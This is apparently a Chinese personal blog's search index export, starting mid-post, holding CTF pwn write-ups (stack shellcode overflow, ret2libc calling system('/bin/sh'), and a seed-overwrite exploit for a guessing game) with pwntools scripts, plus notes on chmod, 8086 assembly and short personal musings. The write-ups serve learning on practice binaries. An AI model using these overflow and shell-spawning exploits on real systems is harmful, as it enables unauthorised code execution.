src="https://s1.ax1x.com/2020/05/23/Yvksv6.png" alt=""></p><p><img src="https://s1.ax1x.com/2020/05/23/YvkdUJ.png" alt=""></p><p><img src="https://s1.ax1x.com/2020/05/23/YvkWUH.png" alt=""><br>所以140个字符+ret返回地址即可</p><h3 id="现在的问题就是找到这个buf的首地址（按照计划shellcode就在首地址）"><a href="#现在的问题就是找到这个buf的首地址（按照计划shellcode就在首地址）" class="headerlink" title="现在的问题就是找到这个buf的首地址（按照计划shellcode就在首地址）"></a>现在的问题就是找到这个buf的首地址（按照计划shellcode就在首地址）</h3><p>由于各种玄学问题buf正真的地址不是我想的那样，这里我引用蒸米@阿里聚安全的原话：</p><pre><code>  对初学者来说这个shellcode地址的位置其实是一个坑。因为正常的思维是使用gdb调试目标程序，然后查看内存来确定shellcode的位置。但当你真的执行exp的时候你会发现shellcode压根就不在这个地址上！这是为什么呢？原因是gdb的调试环境会影响buf在内存中的位置，虽然我们关闭了ASLR，但这只能保证buf的地址在gdb的调试环境中不变，但当我们直接执行./level1的时候，buf的位置会固定在别的地址上。</code></pre><p>解决方法：开启core dump功能。<br>指令：ulimit -c unlimited<br>   sudo sh -c ‘echo “/tmp/core.%t” &gt; /proc/sys/kernel/core_pattern’</p><p>开启后，当运行程序出现内存错误时，系统会生成一个core dump文件在tmp目录下。然后我们用gdb查看该core文件，来推测buf真正的地址。</p><p><img src="https://s1.ax1x.com/2020/05/23/YvkRVe.png" alt=""><br>接下来调试core文件：<br><img src="https://s1.ax1x.com/2020/05/23/Yvk4PA.png" alt=""><br>下面这一步我不太明白为啥是$esp-144得到buf地址。个人觉得应该是-140，如果不正确可以扩大范围<br><img src="https://s1.ax1x.com/2020/05/23/Yvkf5d.png" alt=""><br>将这里的字符串和我们之前造的字符串对比是一致的。所以可以知道我们输入的字符串放在0xffffd000这里。所以buf地址就是0xffffd000.可以写exp了。</p><pre><code>#level1sh = process(&quot;level1&quot;)context(arch=&#39;i386&#39;, os=&#39;linux&#39;, endian=&#39;little&#39;, word_size=32)shellcode = asm(shellcraft.sh())payload = shellcode + &quot;a&quot;*(140-len(shellcode)) + p32(0xffffcff0)#gdb.attach(sh)  ——这里启用的话可以进行调试。sh.sendline(payload)sh.interactive()</code></pre><p><img src="https://s1.ax1x.com/2020/05/23/YvkgbD.png" alt=""><br>成功！！</p><h2 id="level2：NX开启，栈不可执行！"><a href="#level2：NX开启，栈不可执行！" class="headerlink" title="level2：NX开启，栈不可执行！"></a>level2：NX开启，栈不可执行！</h2><p>程序还是一样的就是在编译的时候开其NX保护机制。<br>那么像上面的方法将shellcode填入栈中，再用ret跳转到栈上执行shellcode的方法就不行了。</p><p>小知识：ps指令查看进程（注意pid）<br><img src="https://s1.ax1x.com/2020/05/23/YvkD81.png" alt=""><br>如果你通过sudo cat /proc/[pid]/maps查看，你会发现level1的stack是rwx的，但是level2的stack却是rw的。<br><img src="https://s1.ax1x.com/2020/05/23/YvkcDO.png" alt=""></p><h3 id="接下来由于各种基层问题我引用蒸米的原文-其实是我是辣鸡）："><a href="#接下来由于各种基层问题我引用蒸米的原文-其实是我是辣鸡）：" class="headerlink" title="接下来由于各种基层问题我引用蒸米的原文(其实是我是辣鸡）："></a>接下来由于各种基层问题我引用蒸米的原文(其实是我是辣鸡）：</h3><h4 id="我们知道level2调用了libc-so，并且libc-so里保存了大量可利用的函数，我们如果可以让程序执行system-“-bin-sh”-的话，也可以获取到shell。既然思路有了，那么接下来的问题就是如何得到system-这个函数的地址以及”-bin-sh”这个字符串的地址。如果关掉了ASLR的话，system-函数在内存中的地址是不会变化的，并且libc-so中也包含”-bin-sh”这个字符串，并且这个字符串的地址也是固定的。那么接下来我们就来找一下这个函数的地址。这时候我们可以使用gdb进行调试。然后通过print和find命令来查找system和”-bin-sh”字符串的地址。"><a href="#我们知道level2调用了libc-so，并且libc-so里保存了大量可利用的函数，我们如果可以让程序执行system-“-bin-sh”-的话，也可以获取到shell。既然思路有了，那么接下来的问题就是如何得到system-这个函数的地址以及”-bin-sh”这个字符串的地址。如果关掉了ASLR的话，system-函数在内存中的地址是不会变化的，并且libc-so中也包含”-bin-sh”这个字符串，并且这个字符串的地址也是固定的。那么接下来我们就来找一下这个函数的地址。这时候我们可以使用gdb进行调试。然后通过print和find命令来查找system和”-bin-sh”字符串的地址。" class="headerlink" title="我们知道level2调用了libc.so，并且libc.so里保存了大量可利用的函数，我们如果可以让程序执行system(“/bin/sh”)的话，也可以获取到shell。既然思路有了，那么接下来的问题就是如何得到system()这个函数的地址以及”/bin/sh”这个字符串的地址。如果关掉了ASLR的话，system()函数在内存中的地址是不会变化的，并且libc.so中也包含”/bin/sh”这个字符串，并且这个字符串的地址也是固定的。那么接下来我们就来找一下这个函数的地址。这时候我们可以使用gdb进行调试。然后通过print和find命令来查找system和”/bin/sh”字符串的地址。"></a>我们知道level2调用了libc.so，并且libc.so里保存了大量可利用的函数，我们如果可以让程序执行system(“/bin/sh”)的话，也可以获取到shell。既然思路有了，那么接下来的问题就是如何得到system()这个函数的地址以及”/bin/sh”这个字符串的地址。如果关掉了ASLR的话，system()函数在内存中的地址是不会变化的，并且libc.so中也包含”/bin/sh”这个字符串，并且这个字符串的地址也是固定的。那么接下来我们就来找一下这个函数的地址。这时候我们可以使用gdb进行调试。然后通过print和find命令来查找system和”/bin/sh”字符串的地址。</h4><p>步骤：<br>首先再main函数上下一个断点，然后执行程序，这样的话程序会加载libc.so到内存中。<br>通过print system这个命令来获取system函数在内存中的位置。<br>通过print __libc_start_main这个命令获取libc.so在内存中的起始位置。<br>通过find命令查找/bin/sh这个字符串。</p><p><img src="https://s1.ax1x.com/2020/05/23/YvkBCR.png" alt=""><br>图中字符串/bin/sh有两个一个实在libc中的另一个是出题者给的hint（这个在ida中的字符串也可以找到）两个都可以用。<br>可以写exp了：</p><pre><code>from pwn import*#xctfpwn6 == rop level2sh = process(&quot;level2&quot;)systemaddr = 0xf7e19d10binshaddr = 0x804a024ret = 0x804a024   #要注意的是system()后面跟的是执行完system函数后要返回地址，接下来才是”/bin/sh”字符串的地址。因为我们只需要执行system(&quot;/bin/sh&quot;)函数所以system的返回地址可任意。payload = &quot;a&quot;*140 + p32(systemaddr) + p32(ret) + p32(binshaddr)sh.sendline(payload)sh.interactive()</code></pre><p>连接到端口时脚本为：<br>from pwn import*</p><p>context.log_level = ‘debug’  //虽然不是很明白，但加上这个是有点用处的，可以显示一些细节。<br>elf = ELF(“level2”) // elf只是一个名字，level2是本地文件。<br>sysaddr = elf.symbols[‘system’] // .symbols是用来搜寻函数的，此处搜寻system的地址（在本地文件了level2中搜寻）<br><img src="https://s1.ax1x.com/2020/05/23/Yvkrgx.png" alt=""><br>binshaddr = elf.search(“/bin/sh”).next() // .search 找字符串，汇编代码或者某个数值的地址。</p><p><img src="https://s1.ax1x.com/2020/05/23/Yvkw59.png" alt=""></p><p>payload = “a”*140 + p32(sysaddr) + p32(0) + p32(binshaddr)</p><p>sh = remote(“<strong>**</strong>“, port)</p><p>sh.sendline(payload)</p><p>sh.interactive()</p><p>这里由ida字符串查看可知：<br><img src="https://s1.ax1x.com/2020/05/23/YvktDU.png" alt=""></p><p>本地文件里包括system与/bin/sh，所以在使用相关搜索功能时可以查询到。</p>]]></content>
      
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ELF执行权限</title>
      <link href="/2020/04/23/elf-zhi-xing-quan-xian/"/>
      <url>/2020/04/23/elf-zhi-xing-quan-xian/</url>
      
        <content type="html"><![CDATA[<p>使用chmod命令：<br>chmod用于管理文件或目录的权限，文件或目录权限的控制分别以读取(r)、写入(w)、执行(x)3种<br>可读可写可执行，抽象的用二进制来表示 1 代表拥有该权限，0 代表没有该权限，这样我们就可以看到<br>具有全部权限二进制可理解为  “111”  即 十进制的 “7”，只有读写权限二进制可理解为  “100”  即 十进制的 “4”</p><p>用法：chmod [选项] [文件..]</p><p>权限范围<br>u,User　　　   即文件或目录的拥有者<br>g,Group　　　即文件或目录的所属群组<br>o,Other　　　 除了文件或目录拥有者或所属群组之外，其他用户皆属于这个范围<br>a,All　　　　   即全部的用户，包含拥有者，所属群组以及其他用户<br>r　　　　　　 读取权限，数字代号为“4” 即 “100”<br>w　　　　　　写入权限，数字代号为“2” 即 “010”<br>x　　　　　　 执行或切换权限，数字代号为“1” 即 “001”<br>-　　　　　　 不具任何权限，数字代号为“0” 即 “000”</p><p>&lt;权限范围&gt;+&lt;权限&gt;　　       　　  增加指定权限 (chmod u+r file)<br>&lt;权限范围&gt;-&lt;权限&gt;　　  　　　　删除指定权限 (chmod g-rw file)<br>&lt;权限范围&gt;=&lt;权限&gt;　　　　　　 等于指定权限 (chmod o=rwx file)</p><p>例子：<br><img src="https://s1.ax1x.com/2020/05/23/YjqWND.png" alt=""></p><p>将suanfa文件增加可执行</p>]]></content>
      
      
      
        <tags>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>xctf-gusnum</title>
      <link href="/2020/03/23/xctf-gusnum/"/>
      <url>/2020/03/23/xctf-gusnum/</url>
      
        <content type="html"><![CDATA[<p>1: file<br><img src="https://s1.ax1x.com/2020/05/23/YjOiQA.png" alt="64位"><br>2: checksec<br><img src="https://s1.ax1x.com/2020/05/23/YjOCzd.png" alt="保护全开"><br>3: 运行<br><img src="https://s1.ax1x.com/2020/05/23/YjLxIO.png" alt=""><br>4: ida伪代码<br><img src="https://s1.ax1x.com/2020/05/23/YjOpJe.png" alt=""><br>在用rand（）函数产生随机数时一般用srand（）初始化种子（seed）<br>rand函数调用<br>rand()函数每次调用前都会查询是否调用过srand(seed)，是否给seed设定了一个值，如果有那么它会自动调用srand(seed)一次来初始化它的起始值<br>若之前没有调用srand（seed），那么系统会自动给seed赋初始值，即srand（1）自动调用它一次</p><p>rand（）产生随机数时，如果用srand（seed）播下种子之后，一旦种子相同（下面的getpid方法），产生的随机数将是相同的。当然很多时候刻意让rand（）产生的随机数随机化，用时间作种子 srand（time（NULL）），这样每次运行程序的时间肯定是不相同的，产生的随机数肯定就不一样了。</p><p>从上面伪代码的解析可知：关键在于10次循环，每一次输入的值v4得等于随机数v6（1~6之间）就可以进入sub_C3E函数得到flag</p><p>gets函数：的v7：<br><img src="https://s1.ax1x.com/2020/05/23/YjLvdK.png" alt=""></p><p>可知v7大小0x30-0x10=0x20,下面就是seed这个sedd大小我没从stack中看出，在伪代码中定义的seed是unsigned int seed[2];<br> 大小为8个字节。<br>伪代码中srand用的是seed[0]所以如果能将seed[0]覆盖为以知就可以再写一个程序来得到rand的随机数（在linux中写）<br>得到随机数就能进入目标函数</p><p>尝试：<br>用0x20个字符填满v7后面加上0000，记住gets是将输入做当字符串，所以0000填满了seed[0]后因为seed是int型数据，里面的字符串以ASCII码存入会被直接解释为int数据即：0000的ASCII为0x30303030<br>所以seed的值为0x30303030，所以我们的代码seed值就是0x30303030：<br>#include&lt;stdio.h&gt;<br>#include&lt;stdlib.h&gt;</p><p>int main()<br>{<br>        srand(0x30303030);<br>        int i;<br>        for(i=0;i&lt;=9;i++){<br>                printf(“%d\n”,rand()%6 + 1);<br>        }</p><pre><code>    return 0;</code></pre><p>}<br>结果：</p><p><img src="https://s1.ax1x.com/2020/05/23/YjOSiD.png" alt=""></p><p>所以我们payload = “A”*0x20 + “0000”:<br><img src="https://s1.ax1x.com/2020/05/23/YjO9RH.png" alt=""></p><p>确实如此！！！！</p><p>写exp：<br>rom pwn import*</p><p>context.log_level = ‘debug’</p><p>sh = remote(“<strong>*”,*</strong>)</p><p>sh.recv()</p><p>payload = “A”*0x20 + “0000”</p><p>sh.sendline(payload)</p><p>sh.recv()</p><p>num = [“6”,”5”,”1”,”4”,”3”,”1”,”1”,”4”,”3”,”1”]</p><p>for i in range(10):<br>        sh.sendline(num[i])<br>        sh.recv()</p><p>本地测试：<br><img src="https://s1.ax1x.com/2020/05/23/YjOFsI.png" alt=""></p>]]></content>
      
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Thinking</title>
      <link href="/2019/12/08/her/"/>
      <url>/2019/12/08/her/</url>
      
        <content type="html"><![CDATA[<p>时间无限延长，爱，仅仅是低等文明的一个产物。<br>无论后世的万语千言，请把握我们特殊的文明。<br>For Her loving forever</p>]]></content>
      
      
      
        <tags>
            
            <tag> Her </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>I am here</title>
      <link href="/2019/11/30/look-here/"/>
      <url>/2019/11/30/look-here/</url>
      
        <content type="html"><![CDATA[<p>在有限中以无限去演绎，这才是美妙。</p>]]></content>
      
      
      
        <tags>
            
            <tag> The legend of 1900 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Stay or Leave?</title>
      <link href="/2019/11/30/where-are-you-going/"/>
      <url>/2019/11/30/where-are-you-going/</url>
      
        <content type="html"><![CDATA[<p>总有一条通向黑暗的隧道让你望眼欲穿</p>]]></content>
      
      
      
        <tags>
            
            <tag> Memories of Murder </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>汇编学习</title>
      <link href="/2019/11/29/hello-world-0/"/>
      <url>/2019/11/29/hello-world-0/</url>
      
        <content type="html"><![CDATA[<p>在debug的T指令，如果执行修改ss寄存器的指令，接下来的一条指令也紧接着被执行。<br>具体原因将在后面提到</p><p>   4.1 一个源程序从写出到执行的过程<br>一个汇编语言程序从写出到最终执行的简要过程：<br>第一步：编写汇编源程序。结果是产生一个储存源程序的文本文件<br>第二 步：对源程序进行编译连接。使用汇编语言编译程序对源程序文件中的源程序进行编译，产生目标文件，再用连接程序进行连接，生成可在操作系统中直接执行的文件。</p><p>可执行文件包括三部分：程序（从编译指令翻译过来的机器码）和数据（源程序中定义的数据）以及相关信息的描述（需要占用多少内存之类的）<br>第三步：执行</p><p>操作系统根据文件中的描述信息，将可执行文件中的机器码和数据载入内存中，并进行一些初始化如设置cs：ip指向第一条要执行的指令，然后有cpu执行</p><pre><code>      4.2 源程序</code></pre><p>1：在一个汇编语言源程序中包含两种指令：汇编指令与伪指令<br>汇编指令有对应的机器指令可以被翻译并执行，顾名思义伪指令没有对应机器码翻译后无法执行。<br>  其实伪指令是由编译器来执行的指令，来调节编译工作<br>例子：</p><p>segment和ends：是一对成对使用的伪指令，他们的功能是定义一个段。这是在写可被编译器编译的汇编源程序时必须要用到的一对伪指令<br>格式：<br>     段名 segment<br>           ……..<br>           ……..<br>     段名 ends</p><p>一个汇编源程序是由多个段组成的，这些段用来存放代码，数据，或者当作栈空间。<br>一个源程序所有将被计算机处理的信息：指令，数据，栈，被划分到不同的段中</p><p>end:是一个汇编程序的结束标记，在编译过程中编译器遇到end就结束编译</p><p>Assume：“假设”   它假设某一段寄存器和程序中某个用segment。。。。。Ends定义的段相关联，以后编程时记得用assume将有特定用途的段和相关寄存器关联起来即可</p><p>2：源程序包括汇编指令和伪指令，其中汇编指令组成了由计算机执行的程序，这里的程序指源程序中由计算机执行，处理的指令或数据<br>以后将源程序文件中的所有内容称为源程序，其中由计算机执行，处理的指令或数据称为程序<br>除了汇编指令和伪代码，还有一些标号：如这里的codesg， 一个标号指代了一个地址。如codesg在segment前面作为一个段的名称，这个名称最终被编译连接程序处理为一个段的段地址。</p><p>运算2的3次的源程序：<br>1：定义一个段名为abc<br> Abc segment<br>      。。。<br>Abc ends<br>2：写入汇编指令，实现目标</p><p> Abc segment<br>     Mov ax，2<br>     Add ax，ax<br>     Add ax，ax<br>Abc ends<br>3：指出程序在何处结束<br> Abc segment<br>     Mov ax，2<br>     Add ax，ax<br>     Add ax，ax<br>Abc ends<br>End</p><p>4：abc被当作代码段来利用，所以将abc和cs联系起来<br>Assume cs：abc<br> Abc segment<br>     Mov ax，2<br>     Add ax，ax<br>     Add ax，ax<br>Abc ends<br>End</p><p>5：一个程序结束后，将cpu的控制权交还给使它，使cpu得以继续运行程序<br>所以在程序末尾添加返回的程序段<br>利用 mov ax，4c00H<br>     Int 21H        来实现<br>目前我们只要知道，在程序的末尾使用这两条指令就可以实现程序返回<br>Assume cs：abc<br> Abc segment<br>     Mov ax，2<br>     Add ax，ax<br>     Add ax，ax<br>     Mov ax，4c00H<br>     Int 21H<br>Abc ends<br>End</p><p>与结束相关的概念：</p><pre><code>    4.3 编辑源程序</code></pre><p>可以在任意文本编辑器上编写源程序，只要最终的格式为纯文本即可，保存后将后缀改为asm。如：</p><pre><code>       4.4 编译</code></pre><p>如上图：进入masm后在[.ASM]后面输入要编译的asm文件，此处我的asm文件与masm程序在一个文件里就不需要路径了。<br>然后出现object filename ：编译后的文件名称默认为1.obj<br>继续，出现source listing 这是编译过程的中间产物，可以不理会直接ENTER，以后讲<br>下面的cross-reference 也一样不管<br>最后的两行代码说明这个源程序没有警告错误和必须要改正的错误</p><p>对asm文件编译过后将在同一个文件夹产生1.obj这个编译结果</p><p>在编译过程中我们提供输入（asm文件）最多三个输出：目标文件(.OBJ)，列表文件(.LST)，交叉引用文件(.CRF)，目标文件是我们需要的最终结果，其他是中间结果可以暂时忽略</p><pre><code>      4.5 连接</code></pre><p>与使用masm编译类似第一个提示符：输入可执行文件的名称，这是我们需要的最终结果，下面2行暂时忽略<br>Libraries 这一行：提示输入库文件的名称，库文件里包含了一些可以调用的子程序，如果某个程序调用了就得将相应的库文件与这个目标文件连接，我们这个程序没有调用任何子程序，直接ENTER<br>最后一行：“没有栈段”，这个错误暂时不理会</p><p>第五章[EX]和loop指令<br>[bx]<br>[bx]与内存单元：<br>我们前面学过：[0]表示内存单元的偏移地址为0，其段地址存放在ds寄存器中。<br>那么类似的[bx]表示某个内存单元，其偏移地址在bx中，段地址在ds中。<br>两者根据进行操作的寄存器的长度（类型）表示对应的长度（类型）<br>比如：<br>Mov ax，[0]/[bx]    将某个内存单元的内容送入ax中，这个内存单元的长度为2字节（字单元）<br>Mov lx，[0]/[bx]    将某个内存单元的内容送入lx中，这个内存单元的长度为1字节（字节单元）<br>其中偏移地址在[bx]或偏移地址是0，段地址在ds中<br>[loop]<br>Cup在执行loop指令时会进行两步操作：1、（cx）=（cx）-1  （所以cx中的内容决定了循环次数）  2、判断（cx）的值，如果不为0则转向被标记的地址处执行相应指令，如果为0则向下执行。<br>例如：</p><p>在上图：从mov ax，2开始执行汇编指令，执行了带标号的指令（s）——add ax，ax后向下执行 loop s：对被s标号的指令重复执行，直到cx变为0</p><p>标号：在汇编语言中，标号代表一个地址，上程序有一个标号“s”。他实际上标识了一个地址，在这个地址处有一条指令：add ax，ax</p><p>要点：1、cx中存放循环次数<br>2、loop指令所标识的指令要在loop前面<br>3、需要循环的指令放在标号s 与  loop s之间</p><pre><code>      And和or指令</code></pre><p>And指令：逻辑与指令；按位进行与运算<br>将对应位变为0其他不变，如：<br>Mov al，11111010<br>Add al，01111111   //将al中的第七位变为0——01111010</p><p>Add al，10111111   //将al中的第六位变为0——10111010</p><p>Add al，11111110   //将al中第0位变为0——11111010</p><p>Or指令：逻辑或指令，按位进行或运算<br>将对应位变为1其他不变；如<br>Mov al，11111000<br>Or al，00011111   //将al中的后面5个数变为1——11111111</p><p>Add与0，or或1</p><pre><code>           Div指令</code></pre><p>Div指令用来进行除法运算<br>被除数÷除数=商+余数<br>被除数一般默认放在ax或 ax和dx。<br>除数放在reg（指寄存器）或内存单元中<br>结果放在ax或ax和dx</p><p>两种情况：被除数放在ax——ax是16位寄存器，对应除数应该是8位（字节型数据）。<br>          其结果有商和余数，其中商放在al中，余数放在ah中</p><pre><code>      被除数放在ax和dx中——组成32位（组成一个32位寄存器），对应除数应该是16位（字型数据）      被除数高位放在dx中，低位放在ax中。结果的商放在ax中，余数放在dx中</code></pre><p>高位放余数，低位放商</p><p>格式：<br>Div reg（或内存单元）<br>例如：</p><pre><code>     伪指令dd</code></pre><p>Dd：dword（double word 双字）型数据，用来定义一个双字型数据，还有类似的：<br>Db：define byte 定义字节型数据<br>Dw：define word 定义字型数据</p><p>如：<br>Data segment<br>db 1<br>dw 1<br>dd 1</p><p>Data ends<br>End<br>在data段中定义了三个数据<br>第一个是字节型数据在data:0处占一个字节<br>第二个是字型数据在data：1处占两个字节（一个字）<br>第三个是双字型数据在data:3处占四个字节（两个字）</p><p>dup操作符：与db，dw，dd等一样也是由编译器识别处理。他是和db，dw，dd等数据定义伪指令配合使用的，用来进行数据恢复</p><p>db 3 dup （0）<br>定义了三个字节，他们的值都是0<br>db 3 dup （1，2，3）<br>定义了9个字节，他们是1、2、3、1、2、3、1、2、3<br>定义一个200字节的栈段：<br> Stack segment<br>   db 200 dup（0）<br> Stack ends<br>可以看作将dup中的内容循环列出n次</p><pre><code>       操作符0ffset</code></pre><p>Offset是一个操作符，由编译器处理，作用是：取标号所对应地址的偏移地址<br>如：<br>Start：Mov ax，offset start——mov ax，0      （假设初始地址为0）<br>S：mov ax，offset s——mov ax，3       （上一条指令占3个字节）</p><p>如上图：操作符offset在debug调试中没有出现</p><pre><code>     Jmp指令</code></pre><p>1：依据位移进行转移：<br>Jmp short 标号 —— 执行后cs：ip指向标号地址处的指令<br>段内短转移，ip修改范围是-128~127：指令向下走为正，向上走为负</p><p>Jmp near ptr 标号 —— 执行后cs：ip指向标号地址处的指令<br>段内近转移，ip修改范围是-32768~32767：指令向下走为正，向上走为负</p><p>注：这两个指令“依据位移进行转移”原因是，short 标号或者near ptr 标号 由编译器处理，编译器根据标号地址算出位移地址给cpu使用<br>2：依据目标地址转移<br>Jmp far ptr 标号—— 执行后cs：ip都被修改为标号处的地址<br>段间转移，远转移,直接依据目标地址修改cs：ip</p><pre><code>         转移地址在寄存器jmp</code></pre><p>格式：<br>Jmp reg——ip变为（reg)</p><pre><code>        转移地址在内存中的jmp</code></pre><p>段内转移：<br>Jmp word ptr 内存地址  ：将寄存器ip中的数据改为，对应内存地址中的字数据<br>如：<br>Mov ax，0123h<br>Mov ds:[0]，ax<br>Jmp word ptr ds:[0]  //此处将ip改为（ds:[0]内的字数据）<br>执行后：（ip）=0123h</p><p>段间转移：<br>Jmp dword ptr 内存地址 ：将寄存器cs，ip中的数据改为对应内存单元中的字数据，cs改为高位的字数据，ip改为低位的字数据<br>如：<br>Mov ax，0123h<br>Mov ds:[0]，ax<br>Mov word ptr ds：[2]，0<br>Jmp dword ptr ds:[0]<br>//执行后从ds：[0]开始的两个字数据，cs取其中的高位，ip取其中的低位<br>执行后：（cs）=0000h      （ip）=0123h</p><pre><code>    Jcxz指令</code></pre><p>Jcxz指令是有条件转移指令，所有的有条件转移指令都是短转移，在段内根据位移进行跳转，ip范围是：-128~127</p><p>格式：jcxz 标号  ——执行这个指令前判断：如果寄存器cx=o则进行跳转否则向下走<br>很想这个：if（cx==0）jmp short 标号<br>例如：利用jcxz指令,现实在内存2000H段中查找第一个值为0的字节,找到后,将它的偏移地址存储在dx中.<br>assume cs:codesg<br>codesg segment<br>start:    mov ax,2000H<br>        mov ds,ax<br>        mov bx,0<br>    s:    mov cl,[bx]<br>        mov ch,0<br>        jcxz ok<br>        inc bx<br>        jmp short s</p><pre><code>ok:    mov dx,bx    mov ax,4c00h    int 21h</code></pre><p>codesg ends<br>end start </p><pre><code>          loop指令</code></pre><p>Loop指令是循环指令，所有的循环指令都是短转移，也是根据位移进行转移，ip修改范围是-127~128<br>格式：loop 标号——执行时进行两步操作<br>1：（cx）=（cx）-1<br>2：判断cx，若cx为0不转跳，向下走，若cx不为0转跳<br>相当于：<br>（cx）–；<br>If（cx！=0）jmp short 标号；——从这里可以看出loop指令与有条件转移指令很类似</p><p>Dec功能与inc相反<br>Dec bx ——（bx）=（bx）-1</p>]]></content>
      
      
      
        <tags>
            
            <tag> 这仅仅是个开始 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2019/11/29/hello-world/"/>
      <url>/2019/11/29/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><pre class=" language-bash"><code class="language-bash">$ hexo new <span class="token string">"My New Post"</span></code></pre><p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><pre class=" language-bash"><code class="language-bash">$ hexo server</code></pre><p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><pre class=" language-bash"><code class="language-bash">$ hexo generate</code></pre><p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><pre class=" language-bash"><code class="language-bash">$ hexo deploy</code></pre><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html" target="_blank" rel="noopener">Deployment</a></p><pre class=" language-bash"><code class="language-bash">$ hexo 有点骚</code></pre>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
